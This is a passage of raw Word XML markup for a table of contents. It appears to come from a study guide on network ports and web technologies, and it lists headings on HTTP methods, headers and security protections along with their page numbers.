            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408515 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7CE96EF9" w14:textId="6BDF6935" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408516" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How It Works:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408516 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2253417E" w14:textId="05BF2BA7" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408517" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Ports:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408517 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6F044A60" w14:textId="4DDE5F3B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408518" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Security Issues:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408518 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="12A62948" w14:textId="5CBA9EED" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408519" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protections:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408519 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0B8A71EC" w14:textId="220FD09A" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408520" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Important Ports</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408520 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="59411824" w14:textId="636C8736" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408521" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Part II – Web Technologies</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408521 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3147F9C4" w14:textId="7AFB7126" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408522" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>HyperText Transfer Protocol (HTTP)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408522 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3145A221" w14:textId="37CC0518" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408523" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How It Works:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408523 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5769A23B" w14:textId="0BEE2ADB" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408524" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Security Issues:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408524 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0A818DE6" w14:textId="468FC7D8" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408525" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protections:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408525 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="272D6994" w14:textId="383F4CE1" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408526" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>HTTP Methods</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408526 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="14380F03" w14:textId="7B3D5123" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408527" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Methods</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408527 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="45A49B10" w14:textId="1A21C8B6" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408528" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protections</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408528 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="56DD9EC3" w14:textId="163185DB" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408529" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>HTTP Headers</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408529 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0F20728A" w14:textId="773EFCB5" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408530" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Types of Headers</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408530 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6AD6C77C" w14:textId="134E9733" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408531" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Security Header</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408531 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
